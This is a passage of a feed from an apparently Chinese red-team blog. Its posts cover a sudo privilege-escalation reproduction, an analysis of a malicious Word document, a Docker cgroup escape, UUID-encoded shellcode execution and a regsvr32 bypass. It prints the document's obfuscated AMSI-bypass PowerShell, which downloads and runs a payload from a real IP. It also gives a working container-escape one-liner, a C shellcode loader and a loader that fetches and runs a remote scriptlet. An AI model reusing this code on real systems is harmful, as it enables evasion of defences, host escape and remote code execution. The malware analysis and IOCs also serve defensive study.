    <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Sudo 1.8.2 – 1.8.31p2<br>Sudo 1.9.0 – 1.9.5p1</p><p>sudo官方位于1月26号已经修复，后面在安装的sudo已经补上了<br><img src="https://s3.ax1x.com/2021/01/31/yErSN6.png" alt=""><br>官方链接：<a href="https://www.sudo.ws/" target="_blank" rel="noopener">https://www.sudo.ws/</a></p><p><strong>不影响的版本</strong><br>sudo =&gt;1.9.5p2</p><p>exp：<a href="https://github.com/422926799/note/tree/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2021-3156" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2021-3156</a><br>来源于某微信公众号:<a href="https://mp.weixin.qq.com/s/c9UiJ74TbLXziK08tumIHA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/c9UiJ74TbLXziK08tumIHA</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Debain Sudo version 1.8.31p1<br>Ubuntu Sudo version 1.8.21p2 （昨天安的sudo已经修复）</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>检测是否存在漏洞</p><pre><code>sudoedit -s /</code></pre><p>存在<br><img src="https://s3.ax1x.com/2021/01/31/yErYEq.png" alt=""></p><p>不存在<br><img src="https://s3.ax1x.com/2021/01/31/yErg56.png" alt=""></p><p>下载exp，make。然后运行sudo-hax-me-a-sandwich<br><img src="https://s3.ax1x.com/2021/01/31/yErhxe.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/31/yErbIP.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Sudo 1.8.2 – 1.8.31p2&lt;br&gt;Sudo 1.9.0 – 1.9.5p1&lt;/p&gt;
&lt;p&gt;sudo官方位于1</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>某word恶意VBA样本分析</title>
    <link href="http://422926799.github.io/posts/e2324e90.html"/>
    <id>http://422926799.github.io/posts/e2324e90.html</id>
    <published>2021-01-30T16:45:33.000Z</published>
    <updated>2021-02-01T04:53:58.780Z</updated>
    
    <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1815684465&auto=1&height=66"></iframe></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在群里看到的一个样本。打算分析一下<br>样本来源:<a href="https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#" target="_blank" rel="noopener">https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#</a></p><p>最后修改：2021/2/1</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>winhex打开文档发现是rtf文件<br><img src="https://s3.ax1x.com/2021/02/01/yZAnpQ.png" alt=""></p><p>利用oletools套件里的rtfobj查看<br><img src="https://s3.ax1x.com/2021/02/01/yZAsAK.png" alt=""></p><p>dump出vbs</p><pre><code>rtfobj -s all invoice.doc</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yZALcj.png" alt=""></p><p>Client.vbs：<a href="https://paste.ubuntu.com/p/v74cHNShTq/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/v74cHNShTq/</a><br>由于给出的比较混乱加上app.any.run给出的执行过程，大概一句话:<br>根据判断使用wscript或powershell执行上线</p><p>powershell command分析</p><pre><code class="powershell">[Ref].Assembly.GetType(&#39;Sy&#39; + &#39;stem.&#39; + &#39;Mana&#39; + &#39;gem&#39; + &#39;ent&#39; + &#39;.Autom&#39; + &#39;atio&#39; + &#39;n.A&#39; + &#39;m&#39; + &#39;si&#39; + &#39;Utils&#39;);\n$835FFE1926 = &#39;4456625220575263174452554847&#39;;\n$9FE0AD5C66 = [string](0..13|% {    [char][int](53 + ($835FFE1926).substring(($_ * 2), 2))}) - replace &#39; &#39;;$58FB808063 = $8B0111F552.GetField($9FE0AD5C66, &#39;Non^^^&#39;.replace(&#39;^^^&#39;, &#39;Pub&#39;) + &#39;lic,S&#39; + &#39;tatic&#39;);$58FB808063.SetValue($null, $true);($A72F9B815A = $A72F9B815A = Write - Host &#39;EC4AAB5808223EB722F9C2063ED056665AA80AC5658F9D06815720759C3EB4C4B7065724C3DEFA63DEB58FC3FA9D22121674&#39;);$747586859599494838475575854949393847584855 = @(91, 82, 101, 102, 93, 46, 65, 115, 115, 101, 109, 98, 108, 121, 46, 71, 101, 116, 84, 121, 112, 101, 40, 39, 83, 121, 39, 43, 39, 115, 116, 101, 109, 46, 39, 43, 39, 77, 97, 110, 97, 39, 43, 39, 103, 101, 109, 39, 43, 39, 101, 110, 116, 39, 43, 39, 46, 65, 117, 116, 111, 109, 39, 43, 39, 97, 116, 105, 111, 39, 43, 39, 110, 46, 39, 43, 36, 40, 91, 67, 72, 65, 114, 93, 40, 57, 56, 45, 51, 51, 41, 43, 91, 99, 72, 65, 114, 93, 40, 49, 50, 52, 45, 49, 53, 41, 43, 91, 99, 104, 65, 82, 93, 40, 49, 49, 53, 41, 43, 91, 67, 72, 97, 82, 93, 40, 91, 66, 89, 116, 101, 93, 48, 120, 54, 57, 41, 41, 43, 39, 85, 116, 105, 108, 115, 39, 41, 46, 71, 101, 116, 70, 105, 101, 108, 100, 40, 36, 40, 91, 67, 104, 65, 114, 93, 40, 91, 98, 121, 116, 101, 93, 48, 120, 54, 49, 41, 43, 91, 99, 104, 97, 82, 93, 40, 91, 98, 89, 116, 69, 93, 48, 120, 54, 68, 41, 43, 91, 99, 104, 97, 114, 93, 40, 91, 98, 121, 84, 101, 93, 48, 120, 55, 51, 41, 43, 91, 99, 104, 65, 114, 93, 40, 49, 49, 48, 45, 53, 41, 43, 91, 99, 104, 65, 82, 93, 40, 91, 66, 89, 84, 69, 93, 48, 120, 52, 57, 41, 43, 91, 99, 72, 97, 82, 93, 40, 57, 54, 56, 48, 47, 56, 56, 41, 43, 91, 99, 72, 97, 82, 93, 40, 49, 48, 53, 41, 43, 91, 67, 104, 97, 114, 93, 40, 91, 98, 89, 116, 101, 93, 48, 120, 55, 52, 41, 43, 91, 67, 104, 97, 114, 93, 40, 91, 66, 89, 84, 69, 93, 48, 120, 52, 54, 41, 43, 91, 99, 104, 97, 114, 93, 40, 49, 52, 56, 45, 53, 49, 41, 43, 91, 99, 72, 65, 82, 93, 40, 57, 53, 53, 53, 47, 57, 49, 41, 43, 91, 67, 104, 65, 82, 93, 40, 49, 48, 56, 41, 43, 91, 67, 104, 65, 114, 93, 40, 54, 50, 54, 50, 47, 54, 50, 41, 43, 91, 67, 104, 65, 82, 93, 40, 91, 98, 89, 84, 69, 93, 48, 120, 54, 52, 41, 41, 44, 39, 78, 111, 110, 80, 117, 98, 108, 105, 99, 44, 83, 116, 97, 116, 105, 99, 39, 41, 46, 83, 101, 116, 86, 97, 108, 117, 101, 40, 36, 110, 117, 108, 108, 44, 36, 116, 114, 117, 101, 41, 59, 40, 36, 49, 68, 55, 56, 53, 70, 50, 56, 53, 67, 61, 36, 49, 68, 55, 56, 53, 70, 50, 56, 53, 67, 61, 87, 114, 105, 116, 101, 45, 72, 111, 115, 116, 32, 39, 69, 67, 52, 65, 65, 66, 53, 56, 48, 56, 50, 50, 51, 69, 66, 55, 50, 50, 70, 57, 67, 50, 48, 54, 51, 69, 68, 48, 53, 54, 54, 54, 53, 65, 65, 56, 48, 65, 67, 53, 54, 53, 56, 70, 57, 68, 48, 54, 56, 49, 53, 55, 50, 48, 55, 53, 57, 67, 51, 69, 66, 52, 67, 52, 66, 55, 48, 54, 53, 55, 50, 52, 67, 51, 68, 69, 70, 65, 54, 51, 68, 69, 66, 53, 56, 70, 67, 51, 70, 65, 57, 68, 50, 50, 49, 50, 49, 54, 55, 52, 39, 41, 59, 100, 111, 32, 123, 36, 112, 105, 110, 103, 32, 61, 32, 116, 101, 115, 116, 45, 99, 111, 110, 110, 101, 99, 116, 105, 111, 110, 32, 45, 99, 111, 109, 112, 32, 103, 111, 111, 103, 108, 101, 46, 99, 111, 109, 32, 45, 99, 111, 117, 110, 116, 32, 49, 32, 45, 81, 117, 105, 101, 116, 125, 32, 117, 110, 116, 105, 108, 32, 40, 36, 112, 105, 110, 103, 41, 59, 36, 66, 54, 55, 54, 56, 48, 65, 69, 49, 54, 32, 61, 32, 91, 69, 110, 117, 109, 93, 58, 58, 84, 111, 79, 98, 106, 101, 99, 116, 40, 91, 83, 121, 115, 116, 101, 109, 46, 78, 101, 116, 46, 83, 101, 99, 117, 114, 105, 116, 121, 80, 114, 111, 116, 111, 99, 111, 108, 84, 121, 112, 101, 93, 44, 32, 51, 48, 55, 50, 41, 59, 91, 83, 121, 115, 116, 101, 109, 46, 78, 101, 116, 46, 83, 101, 114, 118, 105, 99, 101, 80, 111, 105, 110, 116, 77, 97, 110, 97, 103, 101, 114, 93, 58, 58, 83, 101, 99, 117, 114, 105, 116, 121, 80, 114, 111, 116, 111, 99, 111, 108, 32, 61, 32, 36, 66, 54, 55, 54, 56, 48, 65, 69, 49, 54, 59, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 61, 32, 78, 101, 119, 45, 79, 98, 106, 101, 99, 116, 32, 45, 67, 111, 109, 32, 77, 105, 99, 114, 111, 115, 111, 102, 116, 46, 88, 77, 76, 72, 84, 84, 80, 59, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 46, 111, 112, 101, 110, 40, 39, 71, 69, 84, 39, 44, 39, 104, 116, 116, 112, 58, 47, 47, 49, 48, 56, 46, 54, 49, 46, 49, 54, 54, 46, 49, 49, 47, 109, 47, 102, 105, 110, 101, 46, 106, 112, 103, 39, 44, 36, 102, 97, 108, 115, 101, 41, 59, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 46, 115, 101, 110, 100, 40, 41, 59, 36, 54, 55, 52, 69, 49, 54, 53, 67, 56, 51, 61, 91, 84, 101, 120, 116, 46, 69, 110, 99, 111, 100, 105, 110, 103, 93, 58, 58, 39, 85, 84, 70, 56, 39, 46, 39, 71, 101, 116, 83, 116, 114, 105, 110, 103, 39, 40, 91, 67, 111, 110, 118, 101, 114, 116, 93, 58, 58, 39, 70, 114, 111, 109, 66, 97, 115, 101, 54, 52, 83, 116, 114, 105, 110, 103, 39, 40, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 46, 114, 101, 115, 112, 111, 110, 115, 101, 84, 101, 120, 116, 41, 41, 124, 73, 96, 69, 96, 88);[System.Text.Encoding]::ASCII.GetString($747586859599494838475575854949393847584855)|I`E`X</code></pre><p>1.首先利用System.Management.Automation.AmsiUtils状态，将检测的语句设置为null。bypass AMI<br>2.将ascii解码利用IEX执行</p><p>去混淆分析</p><pre><code class="powershell">[Ref].Assembly.GetType(&#39;Sy&#39;+&#39;stem.&#39;+&#39;Mana&#39;+&#39;gem&#39;+&#39;ent&#39;+&#39;.Autom&#39;+&#39;atio&#39;+&#39;n.&#39;+$([CHAr](98-33)+[cHAr](124-15)+[chAR](115)+[CHaR]([BYte]0x69))+&#39;Utils&#39;).GetField($([ChAr]([byte]0x61)+[chaR]([bYtE]0x6D)+[char]([byTe]0x73)+[chAr](110-5)+[chAR]([BYTE]0x49)+[cHaR](9680/88)+[cHaR](105)+[Char]([bYte]0x74)+[Char]([BYTE]0x46)+[char](148-51)+[cHAR](9555/91)+[ChAR](108)+[ChAr](6262/62)+[ChAR]([bYTE]0x64)),&#39;NonPublic,Static&#39;).SetValue($null,$true);($1D785F285C=$1D785F285C=Write-Host &#39;EC4AAB5808223EB722F9C2063ED056665AA80AC5658F9D06815720759C3EB4C4B7065724C3DEFA63DEB58FC3FA9D22121674&#39;);do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping); #判断google能否ping通$B67680AE16 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $B67680AE16;$E7DEA8DB03= New-Object -Com Microsoft.XMLHTTP;$E7DEA8DB03.open(&#39;GET&#39;,&#39;http://108.61.166.11/m/fine.jpg&#39;,$false);$E7DEA8DB03.send();$674E165C83=[Text.Encoding]::&#39;UTF8&#39;.&#39;GetString&#39;([Convert]::&#39;FromBase64String&#39;($E7DEA8DB03.responseText))|I`E`X #远程下载执行</code></pre><p>1.利用System.Management.Automation.AmsiUtils状态，将检测的语句设置为null。bypass AMI<br>2.发一个包检测能否连接google.com,如果不成功则重复检测<br>3.远程下载<code>http://108.61.166.11/m/fine.jpg</code> base64解码运行</p><p>fine.jpg<br><img src="https://s3.ax1x.com/2021/01/31/yA8V41.png" alt=""></p><p>经过base64解码得到一下code<br><img src="https://s3.ax1x.com/2021/01/31/yA8YCt.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/31/yA8wDg.png" alt=""><br>1.一如既往的利用System.Management.Automation.AmsiUtils状态，将检测的语句设置为null。bypass AMI<br>2.将@00替换为0x<br>3.利用[System.Reflection.Assembly]::Load加载带有基于通用对象文件格式 (COFF) 的映像的程序集，该映像包含已发出的程序集。 此程序集将会加载到调用方的应用程序域中。<br>4.利用Assembly.Load加载IMAGE_NT_HEADERS变量里的dll，然后调用Quoting类里的SplitUnquoted函数将$ZOIOXMAUI??KDWXAMKYEC参数传入</p><p>提取出来的dll如下<br><img src="https://s3.ax1x.com/2021/01/31/yEYIk4.md.png" alt=""></p><p>根据app.any.run给出的标签属于trojan家族的</p><p>Quoting类里的SplitUnquoted函数<br><img src="https://s3.ax1x.com/2021/01/31/yEaSNF.png" alt=""></p><p>最后所有提取出来的文件<br><img src="https://s3.ax1x.com/2021/02/01/yZEpNT.png" alt=""></p><p>IOCS:<br>Main object- “mal0129-01.zip”<br>    sha256    00789a46bbe5d6537f0b2ebb23a006d51c18752f13c1fac475f39b7e8e0431a4<br>    sha1    3e70416110eca3a4dda6a28e929413193fa008b4<br>    md5    e26e82db7083a2559ecfe147c7696cb9<br>Connections<br>    ip    108.61.166.11<br>HTTP/HTTPS requests<br>    url    <a href="http://108.61.166.11/m/fine.jpg" target="_blank" rel="noopener">http://108.61.166.11/m/fine.jpg</a>    </p><p>微步社区<br><img src="https://s3.ax1x.com/2021/01/31/yAGdRx.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#" target="_blank" rel="noopener">https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.load?view=net-5.0" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.load?view=net-5.0</a><br><a href="https://blog.csdn.net/csdndscs/article/details/103946972" target="_blank" rel="noopener">https://blog.csdn.net/csdndscs/article/details/103946972</a><br><a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>利用cgroup快速逃逸docker</title>
    <link href="http://422926799.github.io/posts/99258750.html"/>
    <id>http://422926799.github.io/posts/99258750.html</id>
    <published>2021-01-28T18:40:23.000Z</published>
    <updated>2021-01-28T18:45:07.556Z</updated>
    
    <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1461215205&auto=1&height=66"></iframe></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在群里看见篇docker逃逸的文章，看到个没见到的操作。复现并记录一波</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>容器拥有特权模式<br>docker run -it –privileged ubuntu /bin/bash</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>payload</p><pre><code>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_releaset=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`touch /o; echo $t/c &gt;$d/release_agent;printf &#39;#!/bin/sh\nhostname &gt;&#39;&quot;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yC3OM9.png" alt=""></p><p>命令刨析</p><pre><code>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)` #寻找cgroup文件夹位置mkdir -p $d/wecho 1 &gt;$d/w/notify_on_release #该文件的内容为1时，当cgroup退出时（不再包含任何进程和子cgroup），将调用release_agent里面配置的命令。新cgroup被创建时将默认继承父cgroup的这项配置。t=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab` #从当前的分区挂载寻找该容器的UIDtouch /oecho $t/c &gt; $d/release_agent #里面包含了cgroup退出时将会执行的命令，系统调用该命令时会将相应cgroup的相对路径当作参数传进去。printf &#39;#!/bin/sh\nhostname &gt;&#39;&quot;$t/o&quot; &gt;/c; #输出&lt;command&gt; \&gt; 和容器pid路径 图二 (将在母机上执行的命令执行到容器根目录里面的o文件)chmod +x /csh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot; #当前cgroup中的所有进程ID，系统不保证ID是顺序排列的，且ID有可能重复 （将进程PID写入除非cgroup执行）sleep 1cat /o</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yC3jq1.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/29/yC3xVx.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/29/yC3za6.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当docker容器使用特权模式启动时，有权操控cgroup，由于cgroup是Linux内核的一个功能。利用cgroup可以直接执行母机的命令 （说法可能有误）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/" target="_blank" rel="noopener">https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/</a><br><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" target="_blank" rel="noopener">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a><br><a href="https://twitter.com/_fel1x/status/1151487051986087936?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1151487053370187776%7Ctwgr%5E&amp;ref_url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F" target="_blank" rel="noopener">https://twitter.com/_fel1x/status/1151487051986087936?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1151487053370187776%7Ctwgr%5E&amp;ref_url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F</a><br><a href="https://zh.wikipedia.org/wiki/Cgroups" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Cgroups</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;</summary>
      
    
    
    
    
    <category term="bypass" scheme="http://422926799.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>UID shellcode硬编码</title>
    <link href="http://422926799.github.io/posts/9f6e42ac.html"/>
    <id>http://422926799.github.io/posts/9f6e42ac.html</id>
    <published>2021-01-25T05:09:49.000Z</published>
    <updated>2021-01-25T05:34:14.180Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>翻文章的时候翻到一篇，将shellcode硬编码成UID。然后在把UID解密写入内存空间后执行的<br>原文链接：<a href="https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/" target="_blank" rel="noopener">https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/</a></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>原文给出的shellcode如下</p><pre><code>1\xc0PhcalcTYP@\x92t\x15Qd\x8br/\x8bv\x0c\x8bv\x0c\xad\x8b0\x8b~\x18\xb2P\xeb\x1a\xb2`H)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W&lt;\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad\x81&lt;\x07WinEu\xef\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99\xff\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></pre><p>shellcode转换成UUID后和原文是对的上的</p><pre><code class="py">import uuidimport binasciiimport chardetbuf=b&quot;1\xc0PhcalcTYP@\x92t\x15Qd\x8br/\x8bv\x0c\x8bv\x0c\xad\x8b0\x8b~\x18\xb2P\xeb\x1a\xb2`H)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W&lt;\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad\x81&lt;\x07WinEu\xef\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99\xff\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;hex_buf=binascii.hexlify(buf).decode()tmp=&quot;&quot;for k in hex_buf:    tmp+=k    if len(tmp)==32:        print(&quot;\&quot;{}\&quot;,&quot;.format(uuid.UUID(bytes_le=binascii.unhexlify(tmp))))        tmp=&quot;&quot;</code></pre><p><img src="https://s3.ax1x.com/2021/01/25/sLP7Ct.png" alt=""></p><p>执行shellcode</p><pre><code class="C">// uuidrun.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &lt;Rpc.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;Rpcrt4.lib&quot;)const char* uuids[] ={    &quot;6850c031-6163-636c-5459-504092741551&quot;,    &quot;2f728b64-768b-8b0c-760c-ad8b308b7e18&quot;,    &quot;1aeb50b2-60b2-2948-d465-488b32488b76&quot;,    &quot;768b4818-4810-48ad-8b30-488b7e300357&quot;,    &quot;175c8b3c-8b28-1f74-2048-01fe8b541f24&quot;,    &quot;172cb70f-528d-ad02-813c-0757696e4575&quot;,    &quot;1f748bef-481c-fe01-8b34-ae4801f799ff&quot;,    &quot;000000d7-0000-0000-0000-000000000000&quot;,};int main(){    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); //在进程的虚拟地址空间中保留空间    void* ha = HeapAlloc(hc, 0, 0x100000); //申请内存    DWORD_PTR hptr = (DWORD_PTR)ha;    int elems = sizeof(uuids) / sizeof(uuids[0]);    for (int i = 0; i &lt; elems; i++) {        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr); //UUID转换为原来的shellcode写入内存        if (status != RPC_S_OK) {            printf(&quot;UuidFromStringA() != S_OK\n&quot;);            CloseHandle(ha);            return -1;        }        hptr += 16;    }    printf(&quot;[*] Hexdump: &quot;);    for (int i = 0; i &lt; elems * 16; i++) {        printf(&quot;%02X &quot;, ((unsigned char*)ha)[i]);    }    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0); //枚举操作系统上安装或支持的语言环境。    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/01/25/sLPqv8.png" alt=""></p><p>原文的shellcode反汇编后如下</p><pre><code class="asm">xor eax, eax ;清空eaxpush raxpush 0x636c6163 ;calcpush rsppop rcxpush raxxchg eax, edx ;交换edx和eax的值，EAX=EDX,EDX=EAXje 0x24push rcxmov esi, dword ptr fs:[rdx + 0x2f] ;寻找PEB地址mov esi, dword ptr [rsi + 0xc]mov esi, dword ptr [rsi + 0xc]lodsd eax, dword ptr [rsi]mov esi, dword ptr [rax]mov edi, dword ptr [rsi + 0x18]mov dl, 0x50jmp 0x3emov dl, 0x60sub rsp, rdxmov rsi, qword ptr gs:[rdx] ;寻找PEB地址mov rsi, qword ptr [rsi + 0x18]mov rsi, qword ptr [rsi + 0x10]lodsq rax, qword ptr [rsi]mov rsi, qword ptr [rax]mov rdi, qword ptr [rsi + 0x30]add edx, dword ptr [rdi + 0x3c]mov ebx, dword ptr [rdi + rdx + 0x28]mov esi, dword ptr [rdi + rbx + 0x20]add rsi, rdimov edx, dword ptr [rdi + rbx + 0x24]movzx ebp, word ptr [rdi + rdx]lea edx, [rdx + 2]lodsd eax, dword ptr [rsi]cmp dword ptr [rdi + rax], 0x456e6957jne 0x50mov esi, dword ptr [rdi + rbx + 0x1c]add rsi, rdimov esi, dword ptr [rsi + rbp*4]add rdi, rsicdq call rdiadd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], al</code></pre><p>尝试用msf的shellcode来整UUID。发现并不行，估计shellcode需要修改，不会改，算篇复现文…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;翻文章的时候翻到一篇，将shellcode硬编码成UID。然后在把UID解密写入内存空间后执行的&lt;br&gt;原文链接：&lt;a href=&quot;http</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>regsvr32绕过</title>
    <link href="http://422926799.github.io/posts/b2680e3b.html"/>
    <id>http://422926799.github.io/posts/b2680e3b.html</id>
    <published>2021-01-19T17:46:02.000Z</published>
    <updated>2021-01-19T17:55:02.087Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>regsvr32为白名单，但是面对各种杀软和defender。早已被拦截，虽然可以命令行绕过，但是在看到某文章后决定复现一波<br>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247486668&amp;idx=1&amp;sn=b490c44dd870307a574818fd2d56e4a3&amp;chksm=fb183ffecc6fb6e80f6ff64781325ebdfc8edc14462b2c6921213dcb72845dc243a2dc6f5176" target="_blank" rel="noopener">regsvr32绕过</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>regsvr32远程下载是调用scrobj.dll里的DllInstall函数实现的下载<br><img src="https://s3.ax1x.com/2021/01/20/sRKxoV.png" alt=""></p><p>IDA分析<br><img src="https://s3.ax1x.com/2021/01/20/sRMSiT.md.png" alt=""></p><p>API Monitor跟踪这个dll<br><img src="https://s3.ax1x.com/2021/01/20/sRM9WF.png" alt=""></p><p>搜索API关键名称CreateURLMonikerEx，找到函数位置<br><img src="https://s3.ax1x.com/2021/01/20/sRMiQJ.png" alt=""></p><p>搜索该函数调用点在sub_1800072D0，符合DllInstall函数调用<br><img src="https://s3.ax1x.com/2021/01/20/sRMZo6.png" alt=""></p><p>调用该函数实现regsvr32实现功能</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define error_print(name){printf(&quot;%s,Error Code:%d&quot;,GetLastError());exit(1);}int main(){        LPCSTR dllpath = &quot;c:\\windows\\system32\\scrobj.dll&quot;;        HMODULE load = LoadLibraryA(dllpath);        if (load == NULL) {               error_print(&quot;LoadLibraryA&quot;);        }        FARPROC getmodule = GetProcAddress(load, &quot;DllInstall&quot;);        if (getmodule == NULL) {               error_print(&quot;GetProcAddress&quot;);        }        ((void(*)(BOOL, TCHAR*))getmodule)(FALSE, L&quot;http://192.168.137.227/testx.txt&quot;); //指针函数调用    return 0;}</code></pre><p>testx.txt</p><pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;&lt;component id=&quot;TESTING&quot;&gt;&lt;registration  progid=&quot;TESTING&quot;  classid=&quot;{A1112221-0000-0000-3000-000DA00DABFC}&quot; &gt;  &lt;script language=&quot;JScript&quot;&gt;    &lt;![CDATA[      var wsc = &quot;WScript.Shell&quot;;      var com = &quot;calc&quot;;      com.concat(&quot;.&quot;,&quot;e&quot;,&quot;x&quot;,&quot;e&quot;);      var foo = new ActiveXObject(wsc).Run(com);    ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/component&gt;</code></pre><p><img 